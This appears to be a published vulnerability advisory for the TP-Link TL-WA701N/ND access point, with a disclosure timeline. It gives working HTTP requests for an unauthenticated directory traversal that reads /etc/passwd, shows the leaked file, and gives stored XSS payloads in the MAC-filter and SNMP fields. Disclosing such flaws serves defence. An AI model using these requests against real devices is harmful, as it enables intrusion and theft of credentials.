@@ -1,0 +1,113 @@
+Device Name: TL-WA701N / TL-WA701ND
+Vendor: TP-Link
+
+============ Vulnerable Firmware Releases: ============
+
+Firmware Version: 3.12.6 Build 110210 Rel.37112n
+Firmware Version: 3.12.16 Build 120228 Rel.37317n - Published Date 2/28/2012
+Hardware Version: WA701N v1 00000000
+Model No.: TL-WA701N / TL-WA701ND
+
+Firmware download: http://www.tp-link.com/en/support/download/?model=TL-WA701ND&version=V1
+
+============ Vulnerability Overview: ============
+
+    * Directory Traversal: 
+
+Access local files of the device. For example you could read /etc/passwd and /etc/shadow.
+
+Request:
+GET /help/../../etc/passwd HTTP/1.1
+Host: 192.168.178.2
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.2/help/
+
+==>> no authentication needed!!!
+
+Response:
+HTTP/1.1 200 OK
+Server: TP-LINK Router
+Connection: close
+WWW-Authenticate: Basic realm="TP-LINK Wireless Lite N Access Point WA701N"
+Content-Type: text/html
+
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+<HTML>
+<HEAD><TITLE>TL-WA701N</TITLE>
+<META http-equiv=Pragma content=no-cache>
+<META http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT">
+<LINK href="/dynaform/css_help.css" rel=stylesheet type="text/css">
+<SCRIPT language="javascript" type="text/javascript"><!--
+if(window.parent == window){window.location.href="http://192.168.178.2";}
+function Click(){ return false;}
+document.oncontextmenu=Click;
+function doPrev(){history.go(-1);}
+//--></SCRIPT>
+root:x:0:0:root:/root:/bin/sh
+Admin:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/bin/sh
+daemon:x:2:2:daemon:/usr/sbin:/bin/sh
+adm:x:3:4:adm:/adm:/bin/sh
+lp:x:4:7:lp:/var/spool/lpd:/bin/sh
+sync:x:5:0:sync:/bin:/bin/sync
+shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
+operator:x:11:0:Operator:/var:/bin/sh
+nobody:x:65534:65534:nobody:/home:/bin/sh
+ap71:x:500:0:Linux User,,,:/root:/bin/sh
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/TP-Link-directory-traversal.png
+
+This traversal vulnerability was already reported on some other TP-Link devices: https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/http-tplink-dir-traversal.nse
+
+    * The request for changing the password is a HTTP GET and the username and password are parameters of this HTTP GET: 
+
+http://192.168.178.2/userRpm/ChangeLoginPwdRpm.htm?oldname=admin&oldpassword=XXXX&newname=admin&newpassword=XXXX&newpassword2=XXXX&Save=Save
+
+    * Stored XSS: 
+
+Injecting scripts into the parameter Desc reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.
+
+-> Wireless MAC Filtering -> Add or Modify -> put your XSS in the description (parameter Desc)
+
+Example Request:
+http://192.168.178.2/userRpm/WlanMacFilterRpm.htm?Mac=00-11-22-33-44-55&Desc=%22%3E%3Cimg+src%3D%220%22+onerror%3Dalert%281)>&Type=1&entryEnabled=1&Changed=0&SelIndex=0&Page=1&vapIdx=1&Save=Save
+
+This XSS vulnerability was already documented on a other device and firmware version: http://www.exploit-db.com/exploits/19774/
+
+    * Stored XSS: 
+
+-> System Tools -> SNMP:
+
+Injecting scripts into the parameter sys_name and sys_location reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.
+
+http://192.168.178.2/userRpm/SnmpRpm.htm?snmp_agent=0&sys_contact=123&sys_name=</script>&sys_location=<script>alert('XSSed')</script>&get_community=111&get_source=123&set_community=123&set_source=111&Save=Save
+
+============ Solution ============
+
+No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de
+Advisory URL: http://www.s3cur1ty.de/m1adv2013-011
+Twitter: @s3cur1ty_de
+
+The traversal vulnerability was already reported on some other TP-Link devices: https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/6.x/http-tplink-dir-traversal.nse
+
+The stored XSS vulnerability in the Desc parameter was already documented on a other device and firmware version: http://www.exploit-db.com/exploits/19774/
+
+============ Time Line: ============
+
+August 2012 - discovered vulnerability
+06.08.2012 - reported vulnerability to TP-Link
+14.02.2013 - public release
+
+===================== Advisory end =====================
